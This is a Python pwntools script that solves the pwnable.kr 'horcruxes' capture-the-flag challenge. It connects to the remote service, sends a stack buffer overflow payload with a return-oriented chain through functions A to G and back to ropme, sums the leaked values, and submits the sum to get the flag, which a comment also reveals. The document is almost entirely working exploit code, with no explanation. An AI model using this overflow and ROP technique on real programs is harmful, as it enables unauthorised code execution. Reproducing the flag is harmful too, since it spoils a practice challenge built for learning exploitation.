from pwn import *
import re

# shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
# shell.download("/home/horcruxes/horcruxes", "./horcruxes")
# io = shell.process('./horcruxes')
io = remote('pwnable.kr', 9032)
elf = ELF('./horcruxes')
A_addr = elf.symbols['A']  # 0x809fe4b
log.success("Tom Riddle's Diary => %s", hex(A_addr))
B_addr = elf.symbols['B']  # 0x809fe6a
log.success("Marvolo Gaunt's Ring => %s", hex(B_addr))
C_addr = elf.symbols['C']  # 0x809fe89
log.success("Helga Hufflepuff's Cup => %s", hex(C_addr))
D_addr = elf.symbols['D']  # 0x809fea8
log.success("Salazar Slytherin's Locket => %s", hex(D_addr))
E_addr = elf.symbols['E']  # 0x809fec7
log.success("Rowena Ravenclaw's Diadem => %s", hex(E_addr))
F_addr = elf.symbols['F']  # 0x809fee6
log.success("Nagini the Snake => %s", hex(F_addr))
G_addr = elf.symbols['G']  # 0x809ff05
log.success("Harry Potter => %s", hex(G_addr))
ropme_addr = elf.symbols['ropme']  # 0x80a0009
call_ropme = 0x809fffc
io.sendlineafter(b'Select Menu:', b'1')
io.recvuntil(b'How many EXP did you earned? : ')
padding = b'A'*(0x74+0x4)
payload = padding + p32(A_addr) + p32(B_addr) + p32(C_addr) + p32(D_addr) + p32(E_addr) + p32(F_addr) + p32(G_addr) + p32(call_ropme)
io.sendline(payload)
sleep(2)
msg = io.recv(1024).decode()
log.info(msg)
matches = re.findall(r'([\w-][\d]+)', msg)
result = sum(list(map(int, matches)))
log.success('result => {}'.format(result))
io.sendline(b'1')
io.recvuntil(b'How many EXP did you earned? : ')
io.sendline(str(result).encode())
flag = io.recvline().decode()   # Magic_spell_1s_4vad4_K3daVr4!
log.success('Flag: %s' % flag)
io.close()